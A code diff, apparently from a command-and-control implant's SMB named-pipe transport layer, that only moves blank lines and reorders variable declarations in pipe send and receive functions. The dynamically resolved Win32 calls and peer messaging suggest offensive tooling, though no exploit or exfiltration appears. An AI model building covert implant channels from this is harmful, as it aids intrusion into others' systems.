@@ -77,7 +77,6 @@ namespace Network {
 
                 req_ctx->endpoint = (wchar_t*) x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t));
                 x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
-
             }
             else {
                 success_(false);
@@ -277,6 +276,7 @@ namespace Network {
 
             do {
                 const auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
+
                 if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                     if (ntstatus == ERROR_NO_DATA) {
                         return false;
@@ -296,6 +296,7 @@ namespace Network {
 
             do {
                 const auto length = MIN((out->length - total), PIPE_BUFFER_MAX);
+
                 if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                     return false;
                 }
@@ -308,14 +309,14 @@ namespace Network {
 
         BOOL PipeSend (_stream *out) {
 
+            bool                success         = true;
             SMB_PIPE_SEC_ATTR   smb_sec_attr    = { };
             SECURITY_ATTRIBUTES sec_attr        = { };
-            bool                success         = true;
 
             if (!Ctx->transport.pipe_handle) {
                 SmbContextInit(&smb_sec_attr, &sec_attr);
-
                 x_assert(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr));
+
                 SmbContextDestroy(&smb_sec_attr);
 
                 if (!Ctx->win32.ConnectNamedPipe(Ctx->transport.pipe_handle, nullptr)) {
@@ -340,10 +341,10 @@ namespace Network {
 
         BOOL PipeReceive(_stream** in) {
 
+            bool        success    = true;
             uint32_t    total      = 0;
             uint32_t    peer_id    = 0;
             uint32_t    msg_size   = 0;
-            bool        success    = true;
 
             if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, (DWORD*) &total, nullptr)) {
                 if (total > sizeof(uint32_t) * 2) {
@@ -354,6 +355,7 @@ namespace Network {
                         ntstatus = ERROR_INVALID_PARAMETER;
                         success_(false);
                     }
+
                     if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), (DWORD*) &total, nullptr)) {
                         if (ntstatus != ERROR_MORE_DATA) {
                             success_(false);
